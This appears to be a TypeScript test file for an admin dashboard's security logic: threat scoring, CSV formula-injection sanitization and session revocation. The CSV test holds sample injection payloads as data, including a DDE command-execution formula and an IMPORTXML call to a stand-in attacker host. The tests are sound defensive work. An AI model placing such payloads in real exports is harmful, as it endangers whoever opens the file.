import test from 'node:test';
import assert from 'node:assert/strict';

test('Threat telemetry calculation detects anomalies and assigns proper threat levels', () => {
  // Pure logic verification of threat scoring algorithm
  const computeThreat = (flaggedCount: number, suspiciousIpsCount: number) => {
    let threatScore = 0;
    threatScore += flaggedCount * 15;
    threatScore += suspiciousIpsCount * 20;
    threatScore = Math.min(100, threatScore);

    let threatLevel: 'NORMAL' | 'ELEVATED' | 'CRITICAL' = 'NORMAL';
    if (threatScore >= 60 || flaggedCount >= 5) {
      threatLevel = 'CRITICAL';
    } else if (threatScore >= 20 || flaggedCount >= 1) {
      threatLevel = 'ELEVATED';
    }
    return { threatScore, threatLevel };
  };

  // Case 1: Zero anomalies => NORMAL
  const normal = computeThreat(0, 0);
  assert.equal(normal.threatScore, 0);
  assert.equal(normal.threatLevel, 'NORMAL');

  // Case 2: 1 anomaly => ELEVATED
  const elevated = computeThreat(1, 1);
  assert.equal(elevated.threatScore, 35);
  assert.equal(elevated.threatLevel, 'ELEVATED');

  // Case 3: 5 anomalies or score >= 60 => CRITICAL
  const critical = computeThreat(5, 2);
  assert.equal(critical.threatScore, 100);
  assert.equal(critical.threatLevel, 'CRITICAL');
});

test('CSV Export sanitization neutralizes Formula Injection attacks', () => {
  // Test formula injection characters: =, +, -, @, \t, \r
  const sanitizeCsvCell = (val: any): string => {
    if (val === null || val === undefined) return '""';
    let str = String(val);
    if (/^[=+\-@\t\r]/.test(str)) {
      str = `'${str}`;
    }
    return `"${str.replace(/"/g, '""')}"`;
  };

  // Regular benign string
  assert.equal(sanitizeCsvCell('ADMIN_LOGIN_SUCCESS'), '"ADMIN_LOGIN_SUCCESS"');

  // Malicious Excel formula injection payload
  assert.equal(sanitizeCsvCell('=cmd|/c calc.exe'), '"\'=cmd|/c calc.exe"');
  assert.equal(sanitizeCsvCell('+123456'), '"\'+123456"');
  assert.equal(sanitizeCsvCell('-SUM(A1:A10)'), '"\'-SUM(A1:A10)"');
  assert.equal(sanitizeCsvCell('@IMPORTXML("http://evil.com")'), '"\'@IMPORTXML(""http://evil.com"")"');

  // Null / undefined handling
  assert.equal(sanitizeCsvCell(null), '""');
  assert.equal(sanitizeCsvCell(undefined), '""');
});

test('Global session revocation logic increments session version', () => {
  const adminUsers = [
    { id: '1', email: 'admin1@ajprworld.com', session_version: 1 },
    { id: '2', email: 'admin2@ajprworld.com', session_version: 3 },
  ];

  // Simulating increment
  const revoked = adminUsers.map(u => ({ ...u, session_version: u.session_version + 1 }));

  assert.equal(revoked[0].session_version, 2);
  assert.equal(revoked[1].session_version, 4);

  // A session with old session_version is rejected
  const oldSessionVersion = 1;
  const isAuthorized = oldSessionVersion === revoked[0].session_version;
  assert.equal(isAuthorized, false, 'Old session must be rejected after revocation');
});
